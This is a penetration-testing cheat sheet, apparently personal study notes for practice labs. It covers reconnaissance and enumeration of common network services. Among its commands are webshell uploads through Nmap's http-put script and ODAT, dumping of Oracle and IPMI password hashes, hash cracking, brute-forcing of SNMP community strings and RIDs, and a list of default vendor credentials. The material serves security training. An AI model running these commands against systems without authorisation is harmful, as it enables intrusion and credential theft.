+++
title = "Version 2"
type = "home"
+++

# 📋 Meta: **Penetration Testing Execution Standard (PTES)**

- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines

| **Step** | **Task**                                                                                                                                                                                                                                                                                                                                                                 |
| -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1.       | Get the user flag on your own                                                                                                                                                                                                                                                                                                                                            |
| 2.       | Get the root flag on your own                                                                                                                                                                                                                                                                                                                                            |
| 3.       | Write your **technical** documentation                                                                                                                                                                                                                                                                                                                                   |
| 4.       | Write your **non-technical** documentation                                                                                                                                                                                                                                                                                                                               |
| 5.       | Compare your notes with the official write-up                                                                                                                                                                                                                                                                                                                            |
| 6.       | Create a list of information you have missed                                                                                                                                                                                                                                                                                                                             |
| 7.       | Watch video or read blog walkthrough and compare it with your notes<br>- https://www.youtube.com/@ippsec/videos<br>- https://ippsec.rocks/?# <br>- https://www.youtube.com/@vbscrub/videos <br> - https://www.youtube.com/watch?v=CU9Iafc-Igs&list=PLF7JR1a3dLONdkRYU_8-5OcgOzrWe2549 <br> - https://www.youtube.com/@LiveOverflow/videos <br> - https://0xdf.gitlab.io/ |
| 8.       | Expand your notes and documentation by adding the missed parts                                                                                                                                                                                                                                                                                                           |

- PowerShell: https://underthewire.tech/wargames
- Linux Terminal: https://overthewire.org/wargames/

- Tmux:
    - https://tmuxcheatsheet.com/
    - https://www.youtube.com/watch?v=Lqehvpe_djs
- Vim:
    - https://vimsheet.com/

## 📦 Recommended Retired Boxes

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

| Box                                                                                           |                                                                                                                                                                                                                                |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)                                 | Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws. |
| [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) | Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.                                                                                                     |
| [Metasploitable 3](https://github.com/rapid7/metasploitable3)                                 | Is a template for building a vulnerable Windows VM configured with a wide range of [vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities).                                                          |
| [DVWA](https://github.com/digininja/DVWA)                                                     | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                                                                      |

---
# 🤝 Pre-Engagement

## 🌐 3rd Parties (Infrastructure)

- AWS: https://aws.amazon.com/es/security/penetration-testing/

## 🔒 Sensitive Data Regulations

- UK: https://www.gov.uk/data-protection
- US:
    - General: https://www.ftc.gov/business-guidance/privacy-security
    - Financial: https://www.ftc.gov/business-guidance/privacy-security/gramm-leach-bliley-act
    - Health: https://www.hhs.gov/hipaa/index.html

# 🔍 Information Gathering/Intelligence Gathering

| **No.** | **Principle**                                                          |
| ------- | ---------------------------------------------------------------------- |
| 1.      | There is more than meets the eye. Consider all points of view.         |
| 2.      | Distinguish between what **we see** and what **we do not see**.        |
| 3.      | There are always ways to gain more information. Understand the target. |

| Layer | Name                    | Goal / Purpose                                                                                                                      |
| :---- | :---------------------- | :---------------------------------------------------------------------------------------------------------------------------------- |
| **1** | **Internet Presence**   | **Discover Assets:** Identify all public-facing domains, subdomains, IPs, and netblocks.                                            |
| **2** | **Gateway**             | **Analyze the Perimeter:** Understand the target's external interfaces and protection mechanisms (e.g., WAF, firewall).             |
| **3** | **Accessible Services** | **Enumerate Services:** Identify and understand the function of every open port and running service on the discovered assets.       |
| **4** | **Processes**           | **Understand Functionality:** Analyze how data is processed by services and identify dependencies between inputs and outputs.       |
| **5** | **Privileges**          | **Identify Permissions:** Determine the privileges of each service's user account and look for overlooked or excessive permissions. |
| **6** | **OS Setup**            | **Internal Recon:** After gaining access, gather information on the OS configuration, security posture, and admin practices.        |

- Ports:
    - https://www.stationx.net/common-ports-cheat-sheet/
    - https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf
    - https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

## 🔎 Search Engine Dorking

- https://www.exploit-db.com/google-hacking-database
- Cached Website: https://web.archive.org/

```bash
site:
inurl:
filetype:
intitle:
intext:
inbody:
cache:
link:
related:
info:
define:
numrange:
allintext:
allinurl:
allintitle:

# Operators
AND
OR
NOT
*
..
" "
-
+

### EXAMPLES
# Finding Login Pages:
site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)
# Identifying Exposed Files:
site:example.com filetype:pdf
site:example.com (filetype:xls OR filetype:docx)
# Uncovering Configuration Files:
site:example.com inurl:config.php
# (searches for extensions commonly used for configuration files)
site:example.com (ext:conf OR ext:cnf)
# Locating Database Backups:
site:example.com inurl:backup
site:example.com filetype:sql
```

## 🏗️ Infrastructure

### 🌐 Subdomains

- Certificate Transparency: https://crt.sh/
- https://domain.glass/
- (PAID) https://buckets.grayhatwarfare.com/

```bash
# Domain => Subdomains via Cert Registry
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
# Full Info 
for i in $(cat subdomainlist.txt) ; do host $i | tee -a hostinfo.txt ; done
# (IPv4) Domain Name => IP Address
for i in $(cat subdomainlist.txt) ; do host $i | grep "has address" | cut -d" " -f1,4 | tee -a domain_ipaddress.txt ; done
# (IPv4) Addresses Only
for i in $(cat domain_ipaddress.txt) ; do host $i | grep "has address" | cut -d" " -f4 | tee -a ip-addresses.txt ; done
# (IPv4) Addresses => Services via Shodan
for i in $(cat ip-addresses.txt) ; do shodan host $i ; done

# DNS: old technique
dig any <DOMAIN>

# Content Search: google.com Dork
inurl:<DOMAIN> intext:<TERM>
```

## 🔍 Scanning

```bash
# -p: source port
# TCP
nc -nvzw5 <TARGET> <PORT>
# UDP
nc -unvzw5 <TARGET> <PORT>

# Connect to Encrypted Service (TLS/SSL)
openssl s_client -starttls ftp -connect <TARGET>:<PORT>

# Banner Grabbing
sudo nmap -n -Pn --script banner.nse <TARGET>
```

## 🗺️ Nmap

- **`Open`** - received TCP SYN-ACK
- **`Closed`** - received TCP RST
- **`Filtered`** - no response
- **`Unfiltered`** - (with `-sA` TCP ACK scans) can't determine the state, but the port is accessible
- **`Open/Filtered`** - can't tell if the port is open or blocked by a firewall
- **`Closed/Filtered`** - (with `-sI` IP ID idle scan) can't tell if the port is closed or blocked by a firewall

Filtering out live hosts for `-iL`:

```bash
# Find Live Hosts
sudo nmap -n -sn --reason -oA host_disc <TARGET>
# Create list
grep 'Status: Up' host_disc.gnmap | awk '{print $2}' | tee live_hosts.txt
# Scan normally w/ list
sudo nmap -n -Pn -sS -sV -sC --reason --top-ports=1000 -oA host_disc_live -iL live_hosts.txt
# Trace packet (MORE INFO)
sudo nmap -n -Pn -sS --packet-trace --disable-arp-ping -p <PORT> <TARGET>

# TCP Full-Connect (3-way handshake)
sudo nmap -n -Pn -sT -sV -sC --reason <TARGET>

# UDP (normally no response)
sudo nmap -n -Pn -sU -sV -sC --reason --top-ports=100 <TARGET>

# Create HTML reports from nmap XML scan
# https://nmap.org/book/output.html
xsltproc <SCAN_FILE>.xml -o <OUTPUT>.html

# SPAM: scan using multiple IP addresses
sudo nmap -n -Pn --max-retries=1 --source-port <SRC_PORT> -D RND:5 <TARGET>

# --max-retries <ATTEMPTS>
# -T <AGGRESSION_1_5>
# --packet-trace
# --reason
# --disable-arp-ping
# --top-ports=<NUM>
# --script <SCRIPT>
# -g <SRC_PORT>
# --dns-server <NAMESERVER>
```

### 📜 Nmap Scripting Engine (NSE)

The Nmap Scripting Engine (NSE) extends Nmap's functionality with custom scripts for vulnerability detection, service enumeration, and exploitation.

**Reference:** [NSE Usage Guide](https://nmap.org/book/nse-usage.html)

#### 📖 How to Use NSE

**Basic Usage:**
- `-sC` - Run a set of popular, common scripts
- `--script` - Run specific scripts by name, category, or file path
- `--script-help` - Show arguments for `--script-args`

**Advanced Usage:**
- Combine scripts with wildcards: `--script "smb-*,http-*"`
- Use comprehensive documentation: [NSE Script Database](https://nmap.org/nsedoc/scripts/)
- Search for scripts: `grep "ftp" /usr/share/nmap/scripts/script.db`

```bash
# --script-trace : trace script scans
nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' -oA nmap_http_put <TARGET>
```

##### 📂 Script Categories

Location: `/usr/share/nmap/scripts`
- https://nmap.org/nsedoc/scripts/

- **auth** - Scripts related to authentication, such as bypassing credentials or checking for default ones.
- **broadcast** - Used to discover hosts on the local network by broadcasting requests.
- **brute** - Scripts that perform brute-force attacks to guess passwords or credentials.
- **default** - The core set of scripts that are run automatically with `-sC` or `-A`.
- **discovery** - Actively gathers more information about a network, often using public registries or protocols like SNMP.
- **dos** - Tests for vulnerabilities that could lead to a denial-of-service attack.
- **exploit** - Actively attempts to exploit known vulnerabilities on a target system.
- **external** - Interacts with external services or databases.
- **fuzzer** - Sends unexpected or randomized data to a service to find bugs or vulnerabilities.
- **intrusive** - These scripts can be noisy, resource-intensive, or potentially crash the target system.
- **malware** - Scans for known malware or backdoors on a target host.
- **safe** - Scripts that are considered safe to run as they are not designed to crash services, use excessive resources, or exploit vulnerabilities.
- **version** - Extends the functionality of Nmap's version detection feature.
- **vuln** - Checks a target for specific, known vulnerabilities.

#### 📥 Install New NSE Script

```bash
sudo wget --output-file /usr/share/nmap/scripts/<SCRIPT>.nse \
    https://svn.nmap.org/nmap/scripts/<SCRIPT>.nse

nmap --script-updatedb
```

## 🌐 Webservers

- OWASP Top 10:
    - https://owasp.org/www-project-top-ten/
- HTTP Codes:
    - https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#Standard_codes
- Web Page Scanner:
    - https://github.com/RedSiege/EyeWitness
- `/.well-known/` URIs:
    - https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml

```bash
# HTTP Headers + robots.txt
curl -skLI -o curl_http_headers.txt http://<TARGET>
curl -skL -o curl_robots.txt http://<TARGET>/robots.txt

===

# Checks for WAF (wbapp firewall)
wafw00f <TARGET>

# Enum web server + version + OS + frameworks + libraries
whatweb --aggression 3 http://<TARGET> --log-brief=whatweb_scan.txt

# Fingerprint web server
nikto -o nikto_fingerprint_scan.txt -Tuning b -h http://<TARGET>

# Enum web server vulns
nikto -o nikto_vuln_scan.txt -h http://<TARGET>

# Enum web app logic & vulns
wapiti -f txt -o wapiti_scan.txt --url http://<TARGET>

# vHost Brute-force
gobuster --quiet --threads 64 --output gobuster_vhost_top5000 vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 --domain <DOMAIN> -u "http://<IP_ADDR>"  # uses IP addr

# Webpage Crawler
pip3 install --break-system-packages scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip && unzip ReconSpider.zip
python3 ReconSpider.py <URL> && cat results.json
# !!! CHECK "results.json" !!!

===

# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Directory brute-force with a common wordlist
gobuster dir --quiet --threads 64 --output gobuster_dir_common --follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url http://<TARGET>

# w/ file extensions
gobuster dir --quiet --threads 64 --output gobuster_dir_medium ---follow-redirect --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --extensions php,html,txt,bak,zip --url http://<TARGET>

### ⚡ FEROXBUSTER: faster and recursive
feroxbuster -t 64 -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 2 -o feroxbuster_dir_common --scan-dir-listings -u http://<TARGET>

===

# AUTOMATED Recon
git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon
chmod +x ./finalrecon.py
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
./finalrecon.py -nb -r -cd final_recon_scan -w /usr/share/wordlists/dirb/common.txt --headers --crawl --ps --dns --sub --dir --url http://<URL>
```

## Fingerprinting

- User-Agent: https://useragents.io/explore
- TTL: https://subinsb.com/default-device-ttl-values/

```bash
# https://nmap.org/book/man-os-detection.html
sudo nmap -n -Pn -v -O <TARGET>
```

# ⚠️ Vulnerability Assessment/Analysis

## 📁 FTP

- `TCP 20`: data transfer
    - Active: Client->Server
    - Passive: Server->Client
- `TCP 21`: control channel
- Server Config: `/etc/vsftpd.conf`
    - http://vsftpd.beasts.org/vsftpd_conf.html
- DISALLOWED FTP users: `/etc/ftpusers`

- Commands: https://web.archive.org/web/20230326204635/https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/
- Server Return Codes: https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes

**TFTP has no auth and uses only UDP.

{{% details "Dangerous Settings" %}}

| **Setting**                    | **Description**                                                                    |
| ------------------------------ | ---------------------------------------------------------------------------------- |
| `anonymous_enable=YES`         | Allowing anonymous login?                                                          |
| `anon_upload_enable=YES`       | Allowing anonymous to upload files?                                                |
| `anon_mkdir_write_enable=YES`  | Allowing anonymous to create new directories?                                      |
| `no_anon_password=YES`         | Do not ask anonymous for password?                                                 |
| `anon_root=/home/username/ftp` | Directory for anonymous.                                                           |
| `write_enable=YES`             | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |
{{% /details %}}

```bash
# Connect to FTP server in passive mode with anonymous login
# Username: anonymous
# Password: (no password required)
ftp -p -a <TARGET>
ftp -p ftp://<USER>:<PASS>@<TARGET>

# Turn off passive mode
passive

# List files and directories
ls -la
ls -laR

# Read file
get <FILENAME> -
# Download file
get <FILENAME>
# Upload file
put <FILENAME>
# Download ALL files
mkdir ftp_files
wget -m --no-passive-ftp ftp://anonymous:anonymous@<TARGET>

# Execute local commands (outside of session)
!<COMMAND>
```

## 📁 SMB/CIFS

- `TCP 135`: RPC Endpoint Mapper (EPM)
- `UDP 137, UDP 138, TPC 139`: legacy (CIFS/SMB1)
- `TCP 445`: RPC/(SMB2/3)
- Shares:
    - `C$` (drive)
    - `ADMIN$` (Windows drive)
    - `IPC$` (RPC)
    - `PRINT$`

{{% details "Dangerous Settings" %}}

|**Setting**|**Description**|
|---|---|
|`browseable = yes`|Allow listing available shares in the current share?|
|`read only = no`|Forbid the creation and modification of files?|
|`writable = yes`|Allow users to create and modify files?|
|`guest ok = yes`|Allow connecting to the service without using a password?|
|`enable privileges = yes`|Honor privileges assigned to specific SID?|
|`create mask = 0777`|What permissions must be assigned to the newly created files?|
|`directory mask = 0777`|What permissions must be assigned to the newly created directories?|
|`logon script = script.sh`|What script needs to be executed on the user's login?|
|`magic script = script.sh`|Which script should be executed when the script gets closed?|
|`magic output = script.out`|Where the output of the magic script needs to be stored?|
{{% /details %}}

```bash
# ANON: List available SMB shares
smbclient -U "" -N --list //<TARGET>/
smbclient -U "guest" -N --list //<TARGET>/

# ANON: Connect to an SMB share
smbclient -U "" -N //<TARGET>/<SHARE>
smbclient -U "guest" -N //<TARGET>/<SHARE>

# Connect to SMB share
smbclient --user=<DOMAIN>/<USERNAME> --password='<PASSWORD>' //<TARGET>/<SHARE>
ls  # List files
more  # read file
get <FILE>  # Download file
recurse  # Toggle directory recursion
# Download recursion
recurse on
prompt off
mget *
# Execute local commands (outside of session)
!<COMMAND>

# List shares
netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares

# Recursively list files
smbmap -r --depth 3 -r <SHARE> -u <USERNAME> -p <PASSWORD> -H <IP>

---

# https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf
# https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html

# RPC
rpcclient --user=<DOMAIN>/<USERNAME> --password='<PASSWORD>' <TARGET>
srvinfo	 # Server information
enumdomains	 # Enumerate all domains
enumdomusers  # Enumerates all domain users
querydominfo	# Provides domain, server, and user info
netshareenumall	 # Enumerates available shares
netsharegetinfo <SHARE>	 # Info about a specific share
queryuser <RID>  # User info

---

# TODO: move these to a more appropriate/relevant section

# Brute-Forcing RIDs via RPC
for i in $(seq 500 1100);do rpcclient -N -U "" <TARGET> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# Same with other tools
samrdump.py <TARGET>
smbmap -H <TARGET>

# Enumeration SMB/NetBIOS
enum4linux-ng -A <TARGET> | tee enum4linux-ng.txt
```

## 📁 NFS

Similiar to SMB.

- `TCP/UDP 111`: NFSv2/v3
    - and various dynamic ports using `rpcbind` and `portmapper`
- `TCP 2049`: NFSv4
- Server Config: `/etc/exports`
    - https://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html

{{% details "Dangerous Options" %}}

| **Dangerous Option** | **Description**                                                                                                      |
| -------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `rw`                 | Read and write permissions.                                                                                          |
| `insecure`           | Ports above 1024 will be used.                                                                                       |
| `nohide`             | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| `no_root_squash`     | All files created by root are kept with the UID/GID 0.                                                               |
{{% /details %}}

```bash
# Show shared dirs
exportfs -sv
# Show NFS Shares on server
showmount -e <TARGET>

# Mount NFS
mkdir target-NFS
sudo mount -t nfs -o nolock <TARGET>:/ ./target-NFS
sudo umount ./target-NFS

# Enumerate
sudo nmap -n -Pn -p111,2049 -sV -sC <TARGET>
sudo nmap -n -Pn -p111,2049 -sV --script 'nfs*' <TARGET>
```

## 🌐 DNS

- `UDP 53`: normal name queries
- `TCP 53`: zone transfers and syncs
- Server Config (Bind9)
    - `/etc/bind/named.conf.local`
    - `/etc/bind/named.conf.options`
    - `/etc/bind/named.conf.log`
    - https://wiki.debian.org/BIND9
- https://web.archive.org/web/20250329174745/https://securitytrails.com/blog/most-popular-types-dns-attacks
- Domain Takeover: https://github.com/EdOverflow/can-i-take-over-xyz

{{% details "Dangerous Settings" %}}

| **Option**        | **Description**                                                                |
| ----------------- | ------------------------------------------------------------------------------ |
| `allow-query`     | Defines which hosts are allowed to send requests to the DNS server.            |
| `allow-recursion` | Defines which hosts are allowed to send recursive requests to the DNS server.  |
| `allow-transfer`  | Defines which hosts are allowed to receive zone transfers from the DNS server. |
| `zone-statistics` | Collects statistical data of zones.                                            |
{{% /details %}}

```bash
# Registrar Info
whois <DOMAIN> | whois.txt

# Query Nameserver for domain
dig @<DNS_SERVER> ns <DOMAIN>

# PTR Record or Reverse DNS Query
dig @<DNS_SERVER> -x <IP_ADDRESS>

# OLD: version / all records / zone transfer
dig @<DNS_SERVER> +short CH TXT version.bind <DOMAIN>
dig @<DNS_SERVER> +short ANY <DOMAIN>
dig @<DNS_SERVER> +short AXFR <DOMAIN>

# --- Record Types ---
# ANY: return all records -- sometimes doesnt work!
# A: IPv4 address
# AAAA: IPv6 address
# CNAME: Canonical Name
# MX: Mail Servers
# NS: Name Servers
# PTR: Pointer Record
# SOA: Start of Authority
# TXT: Text Records
# SRV: Service Records
# CAA: Certification Authority Authorization
for type in A AAAA CNAME MX NS SOA SRV TXT CAA; do echo -e "\n--- $type ---"; dig @<DNS_SERVER> +short $type <DOMAIN>; done

# PASSIVE: subdomain enum
# NOTE: requires API keys
subfinder -v -d <DOMAIN>

# ACTIVE: subdomain enum (quick, external)
puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <DOMAIN>

# ACTIVE: subdomain enum (slower, internal)
# /usr/share/SecLists/Discovery/DNS/namelist.txt
gobuster dns --threads 64 --output gobuster_dns_top110000 --quiet -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --resolver <DNS_SERVER> --domain <DOMAIN>
```

## 📧 SMTP/ESMTP

- `TCP 25`: unencrypted
- `TCP 465/587/2525`: encrypted
- Security:
    - DKIM: https://dkim.org/
    - Sender Policy Framework (SPF): https://dmarcian.com/what-is-spf/
    - DMARC: https://dmarc.org/
- https://serversmtp.com/smtp-error/
{{% details "Dangerous Settings" %}}

| **Option**               | **Description**                                                                                                                                                                          |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mynetworks = 0.0.0.0/0` | With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it. |
{{% /details %}}

```bash
# CAREFUL! Open relay check
sudo nmap -p25,465,587,2525 --script smtp-open-relay <TARGET>

# User enum
# TRY: -M VRFY
smtp-user-enum -v -M RCPT -U <USERLIST> -D <DOMAIN> -t <TARGET>

# Manual enumeration
telnet <TARGET> 25
EHLO <HOSTNAME>
VRFY <USER>  # 250 success; 252 maybe/not; 550 failure
EXPN
```

## 📬 IMAP/POP3

- `TCP 143/993`: IMAP unc/enc
- `TCP 110/995`: POP3 unc/enc

{{% details "Dangerous Settings" %}}

| **Setting**               | **Description**                                                                           |
| ------------------------- | ----------------------------------------------------------------------------------------- |
| `auth_debug`              | Enables all authentication debug logging.                                                 |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.  |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons.                              |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated.                   |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |
{{% /details %}}

```bash
# Enumerate
sudo nmap -n -Pn -sV -sC -p25,110,143,465,587,993,995 <TARGET>

### Non-Interactive

# IMAPS
curl -vkL --user '<USER>':'<PASSWORD>' 'imaps://<TARGET>' -X <COMMAND>

# POP3S
curl -vkL --user '<USER>':'<PASSWORD>' 'pop3s://<TARGET>' -X <COMMAND>

### Interactive

# IMAPS
openssl s_client -connect <TARGET>:imaps
1 LOGIN <USERNAME> <PASSWORD>
1 LIST "" *	# Lists all directories
1 SELECT "<MAILBOX>" # Selects a mailbox
1 UNSELECT "<MAILBOX>" # Exits the selected mailbox
1 FETCH <ID> all # Metadata of email
1 FETCH 1:* (BODY[]) # Show all emails
1 CREATE "INBOX" # Creates a mailbox with a specified name
1 DELETE "INBOX" # Deletes a mailbox
1 RENAME "ToRead" "Important" #	Renames a mailbox
1 LSUB "" *	# Returns a subset of names from the set of names that the User has declared as being active or subscribed
1 CLOSE	# Removes all messages with the Deleted flag set
1 LOGOUT # Closes the connection

# POP3s
openssl s_client -connect <TARGET>:pop3s
USER <USERNAME>
PASS <PASSWORD>
STAT	# List num of saved emails from the server.
LIST	# List number and size of all emails.
RETR <ID>	# Deliver the requested email by ID.
DELE <ID> # Delete the requested email by ID.
CAPA	# Display the server capabilities.
RSET	# Reset the transmitted information.
QUIT	# Close connection
```

## 📊 SNMP

- `UDP 161`: normal
- `UDP 162`: "trap" or alert
- OIDs: https://www.alvestrand.no/objectid/top.html
- Versions:
    - v1/v2c: unencrypted
    - v3: encryption via PSK
- `/etc/snmp/snmpd.conf`
    - https://www.net-snmp.org/docs/man/snmpd.conf.html

*Management Information Base (MIB)* is a text file of *Object Identifier (OID)* s, which provide addresses to access device info, in the *Abstract Syntax Notation One (ASN.1)* based ASCII text format. Community Strings are sort of "passwords" to manage the access level.

{{% details "Dangerous Settings" %}}

| **Settings**                                  | **Description**                                                                       |
| --------------------------------------------- | ------------------------------------------------------------------------------------- |
| `rwuser noauth`                               | Provides access to the full OID tree without authentication.                          |
| `rwcommunity <COMMUNITY_STRING> <IPv4_ADDR>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
| `rwcommunity6 <COMMUNITY_STRING> <IPv6_ADDR>` | Same access as with `rwcommunity` with the difference of using IPv6.                  |
{{% /details %}}

```bash
# Enum via nmap
sudo nmap -n -Pn -sU -p161 -sV --script 'snmp*' --reason -oA nmap_snmp_scan <TARGET>

### Brute-force names of Community Strings
# - Default Strings: "public" (Read-Only) and "private" (Read/Write) are common
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET>
// probably "public"

### Brute-force OIDs and info
# -v 1,2c,3
snmpwalk -v <VERSION> -c <COMMUNITY_STRING> <TARGET> .1

### Brute-force OIDs
# -2 : use v2
# braa usu. uses Version 1
braa <COMMUNITY_STRING>@<TARGET>:.1.*
braa <COMMUNITY_STRING>@<TARGET>:.1.3.6.*
```

## 🗄️ Oracle TNS

- `TCP 1521`: normal
- Server Config:
    - `$ORACLE_HOME/network/admin/tnsnames.ora`: names to addrs
    - `$ORACLE_HOME/network/admin/listener.ora`: listener behavior
    - `$ORACLE_HOME/sqldeveloper`: DB protection blacklist
    - Default Password: `DBSNMP/dbsnmp`
- https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985

Oracle's version of SQL.

```bash
# SID Brute-forcing via nmap
sudo nmap -p1521 -sV --script oracle-sid-brute <TARGET>

### ODAT
# TNS Setup for Enumeration
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install --break-system-packages python-libnmap
git submodule init
git submodule update
pip3 install --break-system-packages cx_Oracle
sudo apt install -y python3-scapy
sudo pip3 install --root-user-action colorlog termcolor passlib python-libnmap
sudo apt install -y build-essential libgmp-dev
pip3 install --break-system-packages pycryptodome

# Enumeration
odat.py all -d <SID> -s <TARGET>

### Connect
# Install: https://askubuntu.com/a/207145
sqlplus <USER>/<PASSWORD>@<TARGET>/<SID>
sqlplus <USER>/<PASSWORD>@<TARGET>/<SID> as sysdba
# https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
# If you come across the following error sqlplus:
# error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, 
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf" ; sudo ldconfig

# SQL Commands
select table_name from all_tables ;
select * from user_role_privs ;
select name, password from sys.user$ ;

### Upload webshell (if webserver)
# Linux	/var/www/html
# Windows	C:\inetpub\wwwroot
echo "Oracle File Upload Test" > testing.txt
odat.py utlfile -d <SID> -U <USER> -P <PASSWORD> -s <TARGET> --sysdba --putFile <UPLOAD_DIR> testing.txt ./testing
curl -Lo- http://<TARGET>/testing.txt
```

## ⚙️ IPMI

- `UDP 623`: normal
- Default Passwords:
    - Dell iDRAC:	`root:calvin`
    - HP iLO: `Administrator:[randomized 8-character string consisting of numbers and uppercase letters]`
    - Supermicro IPMI: `ADMIN:ADMIN`

A hardware control protocol that gives "virtual" physical access to a machine.

{{% details "Dangerous Settings" %}}

- Server sends the salted hash of the user's password to the user before authentication

{{% /details %}}

```bash
### Enumeration via nmap
sudo nmap -sU -p623 --script ipmi-version

### Metasploit Scanner
setg RHOSTS <TARGET>
# https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/
use auxiliary/scanner/ipmi/ipmi_version
run
# https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/
use auxiliary/scanner/ipmi/ipmi_dumphashes
run

### Crack HP iLO format
# https://hashcat.net/wiki/doku.php?id=example_hashes
hashcat -m 7300 ipmi_hash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
hashcat -m 7300 -w 3 -O "<HASH>" /usr/share/wordlists/rockyou.txt
```

## 🔐 Nix: SSH

- `TCP 22`: normal
- Server Config:
    - `/etc/ssh/sshd_config`
    - https://www.ssh.com/academy/ssh/sshd_config
- Versions:
    - v1: obselete and vuln to MITM
    - v2: modern

{{% details "Dangerous Settings" %}}
- https://www.ssh-audit.com/hardening_guides.html

| **Setting**                  | **Description**                             |
| ---------------------------- | ------------------------------------------- |
| `PasswordAuthentication yes` | Allows password-based authentication.       |
| `PermitEmptyPasswords yes`   | Allows the use of empty passwords.          |
| `PermitRootLogin yes`        | Allows to log in as the root user.          |
| `Protocol 1`                 | Uses an outdated version of encryption.     |
| `X11Forwarding yes`          | Allows X11 forwarding for GUI applications. |
| `AllowTcpForwarding yes`     | Allows forwarding of TCP ports.             |
| `PermitTunnel`               | Allows tunneling.                           |
| `DebianBanner yes`           | Displays a specific banner when logging in. |
{{% /details %}}

```bash
# Audit sercurity of SSH server
# https://github.com/jtesta/ssh-audit
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py -l warn <TARGET> | tee ssh_audit.txt

# Specify auth-method: password
ssh -v -o PreferredAuthentications=password <USER>@<TARGET>

sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>

# Force auth-method: privkey
ssh -i <PRIVATE_KEY> <USER>@<TARGET>
```

## 📤 Nix: Rsync

- `TCP 873`: normal
- Pentesting: https://archive.ph/flPtZ
- Rsync via `ssh`: https://phoenixnap.com/kb/how-to-rsync-over-ssh

```bash
# Enum via nmap
sudo nmap -sV -p873 <TARGET>

# Enum dir
rsync -av --list-only rsync://<TARGET>/<DIR>

# Download dir optionally via SSH
rsync -av -e "ssh -p <SSH_PORT>" rsync://<TARGET>/<DIR>
```

## 🔧 Nix: R-services

